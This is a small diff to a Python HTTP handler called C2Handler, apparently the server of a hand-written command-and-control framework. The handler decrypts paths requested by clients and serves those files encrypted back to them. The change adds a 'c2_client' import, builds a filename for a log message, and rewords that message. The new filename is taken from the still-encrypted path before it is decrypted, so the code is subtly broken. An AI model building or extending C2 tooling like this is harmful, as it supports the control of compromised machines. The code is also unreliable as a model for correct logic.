@@ -8,6 +8,8 @@ from colorama import Fore
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from os import path, mkdir
+
+from c2_client import client
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
@@ -152,6 +154,9 @@ class C2Handler(BaseHTTPRequestHandler):
             # Split out the encrypted filepath from HTTP GET Request
             filepath = self.path.split(FILE_REQUEST)[1]
 
+            # Split out the filename from the filepath to use in Print Message
+            filename = path.basename(filepath)
+
             # Encode the file path because decrypt requires it, then decrypt and then decode it
             filepath = cipher.decrypt(filepath.encode()).decode()
 
@@ -160,7 +165,8 @@ class C2Handler(BaseHTTPRequestHandler):
                 with open(f"{filepath}", "rb") as fileHandle:
                     self.http_response(200)
                     self.wfile.write(cipher.encrypt(fileHandle.read()))
-                print(f"{filepath} has been Downloaded from C2 Server")
+
+                print(f"{filename} has been Downloaded on client from C2 Server")
 
             except (FileNotFoundError, OSError):
                 print(f"{filepath} was not found on C2 Server.")
